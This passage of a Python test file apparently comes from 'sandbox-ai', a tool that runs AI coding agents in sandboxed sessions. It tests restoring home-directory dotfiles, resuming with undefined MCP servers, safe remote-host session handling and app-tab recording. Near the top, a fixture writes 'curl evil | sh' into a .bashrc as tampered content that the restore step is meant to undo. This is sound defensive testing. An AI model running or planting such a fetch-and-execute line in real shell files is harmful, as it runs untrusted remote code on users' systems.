            m.restore_home("web", paths=[".nothing"], yes=True)
        m.save("web", {**m.load("web"), "pid": 4242})
        with unittest.mock.patch.object(m, "alive", lambda name, d: True):
            with pytest.raises(ValueError, match="stop it first"):
                m.restore_home("web", yes=True)
        assert (home / ".bashrc").read_text().endswith("curl evil | sh\n")
    else:
        # Asked file by file; only --path's files; a folder on the way that became a link is not followed.
        answers = iter(["y"])
        assert m.restore_home("web", paths=[".bashrc", ".zshrc"], ask=lambda q: next(answers),
                              out=lines.append) == 0
        assert (home / ".bashrc").read_text() == "export A=1\n"
        assert "-curl evil | sh" in lines
        assert any("left as it is: .zshrc" in line for line in lines)
        (tmp_path / "elsewhere").mkdir()
        (home / ".claude").rename(tmp_path / "claude-away")
        (home / ".claude").symlink_to(tmp_path / "elsewhere")
        lines.clear()
        assert m.restore_home("web", yes=True, out=lines.append) == 0
        assert not any((tmp_path / "elsewhere").iterdir())
        assert any(".claude" in line and "left as it is" in line for line in lines)


def test_a_resume_names_mcp_servers_that_are_not_defined_and_how_to_resume_without_them(tmp_path, monkeypatch):
    """Regression ("Unknown MCP server: search; defined: demo, yara" in the supervisor's log at every resume): a
    session started with --no-config and the project's own servers (an older board start) cannot find them; the resume
    says so before anything starts, why, and how to resume without them (--drop-option mcp=NAME)."""
    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / "config"))
    project = tmp_path / "tor-network"
    project.mkdir()
    (project / ".sandbox-ai.json").write_text(json.dumps({"version": 1, "agent": "codex", "mcp_servers": {
        "search": {"command": ["uvx", "duckduckgo-mcp-server"]}}}))
    data = make_session("s")
    data["options"] = ["--no-config", "--workspace", str(project), "--mcp", "search", "--mcp", "demo"]
    m.save("s", data)
    monkeypatch.setattr(m, "launch", Mock(side_effect=AssertionError("must not start")))
    with pytest.raises(ValueError) as caught:
        m.resume("s")
    said = str(caught.value)
    assert "Unknown MCP server: search; defined: demo" in said and "--no-config" in said
    assert "sandbox-ai resume s --drop-option mcp=search" in said
    with pytest.raises(ValueError, match="--drop-option mcp=search"):  # `--session s` again: the same
        m.start_locked(m.launcher().parse_args(["codex", "--session", "s"]), ["codex", "--session", "s"], "s")
    # Without it, it starts.
    monkeypatch.setattr(m, "launch", Mock(return_value=0))
    data["options"] = ["--no-config", "--workspace", str(project), "--mcp", "demo"]
    m.save("s", data)
    assert m.resume("s") == 0


def test_a_host_that_cannot_say_whether_it_has_the_session_never_loses_it(monkeypatch):
    """Review: "could not tell" (an older sandbox-ai without `session plan`, SSH failing on that call) was taken for
    "none there"; a failed start then deleted that host's own stopped session, HOME included."""
    make_session("work")

    class Older(Remote):
        def __call__(self, host, args, timeout=120):
            if args[:2] == ["session", "plan"]:
                self.calls.append(list(args))
                return 2, "", "sandbox-ai session: invalid choice: 'plan'\n"
            return super().__call__(host, args, timeout)
    remote, lines = Older({"work": ["--workspace", "/home/me/own"]},
                          start=(1, "", "agent-sandbox: Session failed to start (status 1)\n")), []
    assert m.copy_to_host("work", "ct1", run=remote, out=lines.append) == 1
    assert "could not be told" in "\n".join(lines)
    assert ["session", "delete", "work", "--yes"] not in remote.calls and "work" in remote.sessions


def test_launch_records_the_app_tab_it_was_started_in(tmp_path, monkeypatch):
    """The desktop app sets SANDBOX_AI_APP_TAB in each terminal tab: a start (or resume) there records it, so that
    the app attaches a tab for it again after a restart; started elsewhere it records none (an old one goes)."""
    data = make_session("s")
    monkeypatch.setattr(m, "clear_stale_pod", lambda name, d: None)

    def popen(cmd, **kwargs):
        (m.session_dir("s") / "tmux" / "attach.sock").touch()
        return Mock(pid=4243, poll=Mock(return_value=None))
    monkeypatch.setattr(m.subprocess, "Popen", popen)
    monkeypatch.setenv("SANDBOX_AI_APP_TAB", "0123456789abcdef")
    assert m.launch("s", data, []) == 0
    assert m.load("s")["app_tab"] == "0123456789abcdef"
    for value in ("", "short", "no spaces allowed here", "x" * 65):
        monkeypatch.setenv("SANDBOX_AI_APP_TAB", value)
        assert m.launch("s", m.load("s"), []) == 0
        assert "app_tab" not in m.load("s"), value
